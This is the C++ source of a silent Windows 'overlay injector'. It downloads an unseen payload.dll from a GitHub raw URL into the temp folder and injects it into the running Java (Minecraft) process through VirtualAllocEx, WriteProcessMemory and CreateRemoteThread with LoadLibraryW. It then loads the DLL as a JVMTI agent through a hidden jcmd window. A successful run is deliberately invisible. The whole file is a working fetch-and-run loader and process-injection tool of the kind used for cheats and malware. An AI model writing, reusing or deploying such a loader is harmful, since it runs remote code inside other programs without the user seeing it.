// injector_gui.cpp - standalone silent injector for the overlay payload.
//
// Double-click (or run) injector.exe and it will:
//   1. download payload.dll from GitHub;
//   2. find the running Minecraft java(w).exe;
//   3. load the DLL into it with LoadLibraryW;
//   4. register the same module as a JVMTI agent with jcmd, which is what
//      enables the Minecraft.tick() hook (no Python, no command window).
//
// Built as a GUI-subsystem binary: no console is created. Errors are shown in
// a message box; a successful run is completely silent.

#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <windows.h>
#include <tlhelp32.h>
#include <urlmon.h>
#include <cstdio>
#include <cstdlib>
#include <string>
#include <vector>

namespace {

const wchar_t* kPayloadUrl =
    L"https://raw.githubusercontent.com/worex432-prog/Roblox/main/payload.dll";

void Error(const wchar_t* text) {
    MessageBoxW(nullptr, text, L"Overlay injector", MB_ICONERROR | MB_OK | MB_TOPMOST);
}

std::wstring TempDir() {
    wchar_t buffer[MAX_PATH] = {};
    GetTempPathW(MAX_PATH, buffer);
    return buffer;
}

std::wstring Timestamp() {
    SYSTEMTIME t{};
    GetSystemTime(&t);
    wchar_t buffer[64] = {};
    _snwprintf_s(buffer, 64, L"%04u%02u%02u-%02u%02u%02u",
                 t.wYear, t.wMonth, t.wDay, t.wHour, t.wMinute, t.wSecond);
    return buffer;
}

DWORD FindMinecraftProcess() {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W entry{};
    entry.dwSize = sizeof(entry);
    DWORD found = 0;
    if (Process32FirstW(snap, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, L"javaw.exe") == 0 ||
                _wcsicmp(entry.szExeFile, L"java.exe") == 0) {
                found = entry.th32ProcessID;
                break;
            }
        } while (Process32NextW(snap, &entry));
    }
    CloseHandle(snap);
    return found;
}

std::wstring ProcessImagePath(DWORD pid) {
    HANDLE process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!process) return L"";
    wchar_t buffer[2048] = {};
    DWORD size = 2048;
    BOOL ok = QueryFullProcessImageNameW(process, 0, buffer, &size);
    CloseHandle(process);
    return ok ? std::wstring(buffer, size) : L"";
}

bool FileExists(const std::wstring& path) {
    return GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES;
}

bool DownloadPayload(const std::wstring& path) {
    HRESULT hr = URLDownloadToFileW(nullptr, kPayloadUrl, path.c_str(), 0, nullptr);
    if (FAILED(hr) || !FileExists(path)) {
        wchar_t message[512] = {};
        _snwprintf_s(message, 512, L"Не удалось скачать payload.dll с GitHub (HRESULT 0x%08lX).",
                     static_cast<unsigned long>(hr));
        Error(message);
        return false;
    }
    WIN32_FILE_ATTRIBUTE_DATA info{};
    if (!GetFileAttributesExW(path.c_str(), GetFileExInfoStandard, &info) ||
        info.nFileSizeLow < 1024) {
        Error(L"Скачанный payload.dll пустой или повреждён.");
        return false;
    }
    return true;
}

bool RemoteLoadLibrary(DWORD pid, const std::wstring& path) {
    HANDLE process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
    if (!process) {
        Error(L"OpenProcess не удался. Запусти injector.exe от администратора.");
        return false;
    }
    HMODULE kernel = GetModuleHandleW(L"kernel32.dll");
    FARPROC load = kernel ? GetProcAddress(kernel, "LoadLibraryW") : nullptr;
    if (!load) {
        CloseHandle(process);
        Error(L"LoadLibraryW не найден в kernel32.dll.");
        return false;
    }
    const size_t bytes = (path.size() + 1) * sizeof(wchar_t);
    void* memory = VirtualAllocEx(process, nullptr, bytes, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!memory || !WriteProcessMemory(process, memory, path.c_str(), bytes, nullptr)) {
        if (memory) VirtualFreeEx(process, memory, 0, MEM_RELEASE);
        CloseHandle(process);
        Error(L"Не удалось записать путь к DLL в процесс игры.");
        return false;
    }
    HANDLE thread = CreateRemoteThread(process, nullptr, 0,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(load), memory, 0, nullptr);
    bool ok = false;
    if (thread) {
        if (WaitForSingleObject(thread, 20000) == WAIT_OBJECT_0) {
            DWORD result = 0;
            GetExitCodeThread(thread, &result);
            ok = result != 0;
        }
        CloseHandle(thread);
    }
    VirtualFreeEx(process, memory, 0, MEM_RELEASE);
    CloseHandle(process);
    if (!ok) Error(L"LoadLibraryW в игре не сработал.");
    return ok;
}

bool FindFileRecursive(const std::wstring& root, const wchar_t* name,
                       std::wstring& result, int depth) {
    if (depth > 6 || root.empty()) return false;
    std::wstring pattern = root + L"\\*";
    WIN32_FIND_DATAW data{};
    HANDLE find = FindFirstFileW(pattern.c_str(), &data);
    if (find == INVALID_HANDLE_VALUE) return false;
    bool found = false;
    do {
        if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (data.cFileName[0] == L'.') continue;
            std::wstring sub = root + L"\\" + data.cFileName;
            if (FindFileRecursive(sub, name, result, depth + 1)) { found = true; break; }
        } else if (_wcsicmp(data.cFileName, name) == 0) {
            result = root + L"\\" + data.cFileName;
            found = true;
            break;
        }
    } while (FindNextFileW(find, &data));
    FindClose(find);
    return found;
}

std::wstring FindJcmd(DWORD pid) {
    const std::wstring image = ProcessImagePath(pid);
    if (!image.empty()) {
        const size_t slash = image.find_last_of(L'\\');
        if (slash != std::wstring::npos) {
            const std::wstring candidate = image.substr(0, slash) + L"\\jcmd.exe";
            if (FileExists(candidate)) return candidate;
        }
    }
    wchar_t fromPath[MAX_PATH] = {};
    if (SearchPathW(nullptr, L"jcmd.exe", nullptr, MAX_PATH, fromPath, nullptr) > 0 &&
        FileExists(fromPath)) return fromPath;

    const wchar_t* javaHome = _wgetenv(L"JAVA_HOME");
    if (javaHome && *javaHome) {
        const std::wstring candidate = std::wstring(javaHome) + L"\\bin\\jcmd.exe";
        if (FileExists(candidate)) return candidate;
    }
    const wchar_t* appdata = _wgetenv(L"APPDATA");
    if (appdata && *appdata) {
        const std::wstring root =
            std::wstring(appdata) + L"\\Polyfrost\\OneClient\\metadata\\java";
        std::wstring result;
        if (FindFileRecursive(root, L"jcmd.exe", result, 0)) return result;
    }
    return L"";
}

bool RegisterJvmtiAgent(DWORD pid, const std::wstring& dllPath) {
    const std::wstring jcmd = FindJcmd(pid);
    if (jcmd.empty()) {
        Error(L"jcmd.exe не найден. Нужен JDK (не JRE). Тик-хук не будет установлен.");
        return false;
    }
    std::wstring command = L"\"" + jcmd + L"\" " + std::to_wstring(pid) +
                           L" JVMTI.agent_load \"" + dllPath + L"\"";
    std::vector<wchar_t> mutableCommand(command.begin(), command.end());
    mutableCommand.push_back(L'\0');

    STARTUPINFOW startup{};
    startup.cb = sizeof(startup);
    startup.dwFlags = STARTF_USESHOWWINDOW;
    startup.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION process{};
    BOOL created = CreateProcessW(jcmd.c_str(), mutableCommand.data(), nullptr, nullptr,
                                  FALSE, CREATE_NO_WINDOW, nullptr, nullptr,
                                  &startup, &process);
    if (!created) {
        Error(L"Не удалось запустить jcmd.exe.");
        return false;
    }
    bool ok = false;
    if (WaitForSingleObject(process.hProcess, 20000) == WAIT_OBJECT_0) {
        DWORD code = 0;
        GetExitCodeProcess(process.hProcess, &code);
        ok = code == 0;
    }
    CloseHandle(process.hThread);
    CloseHandle(process.hProcess);
    if (!ok) Error(L"JVMTI.agent_load не удался (см. вывод jcmd).");
    return ok;
}

} // namespace

int WINAPI wWinMain(HINSTANCE, HINSTANCE, PWSTR, int) {
    const DWORD pid = FindMinecraftProcess();
    if (!pid) {
        Error(L"Minecraft (javaw.exe) не найден. Сначала запусти игру.");
        return 1;
    }
    const std::wstring path = TempDir() + L"ovl_payload-" + Timestamp() + L".dll";
    if (!DownloadPayload(path)) return 1;
    if (!RemoteLoadLibrary(pid, path)) return 1;
    RegisterJvmtiAgent(pid, path);  // Non-fatal: the render fallback still works.
    return 0;
}
